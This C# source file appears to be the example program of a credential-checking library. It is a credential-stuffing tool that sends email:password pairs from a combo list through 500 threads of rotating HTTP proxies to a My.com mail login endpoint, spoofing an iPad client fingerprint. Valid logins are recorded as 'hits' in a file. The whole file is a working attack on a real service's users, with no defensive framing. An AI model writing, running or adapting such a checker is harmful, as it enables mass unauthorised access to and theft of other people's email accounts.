using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Byte.Library;
using Byte.Library.Utilities;
using Byte.Library.Utilities.Combos;
using Leaf.xNet;

namespace Byte.Library.Example
{
    class Program
    {
        static void Main(string[] args)
        {
            var utilsManager = new Manager()
                .UploadCombo("combo.txt")
                .UploadProxies("proxies.txt");

            var settings = new LibrarySettings(TitlePreffix: "Test Checker")
            {
                proxyType = ProxyType.HTTP,
                Threads = 500,
                Timeout = 8000,
                MethodCheck = testMethod,
                UtilsManager = utilsManager,
                ListeningKeys = new ListeningKeys(Enable: true)
                {
                    GetCheckedLines = ConsoleKey.C, // uncheckedlines.txt
                    GetUncheckedLines = ConsoleKey.S // checkedlines.txt
                }
            };

            new ByteLibrary(settings)
                .Start();

            Console.ReadLine();
        }

        public static HitControl testMethod(HttpRequest httpRequest, Combo combo)
        {
            var resp = httpRequest.Get("https://aj-https.my.com/cgi-bin/auth?reqmode=fg&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS%C2%A4t=MyCom&mmp=mail&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS%C2%A4t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=fr_FR&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&Login=" + combo.email + "&Password=" + combo.password).ToString();

            if (resp.Contains("Ok=1"))
            {
                Console.ForegroundColor = ConsoleColor.Green;

                string account = combo.email + ":" + combo.password;
                Console.WriteLine(account);

                File.WriteAllText("hits.txt", account);

                Console.ResetColor();

                return HitControl.HIT; // this only add 1 to the hit in the console
            }
            else if (resp.Contains("Ok=0"))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(combo.email + ":" + combo.password);
                Console.ResetColor();

                return HitControl.FAIL; // fail?
            }

            return HitControl.RETRY; // retry same account with different proxy
        }
    }
}
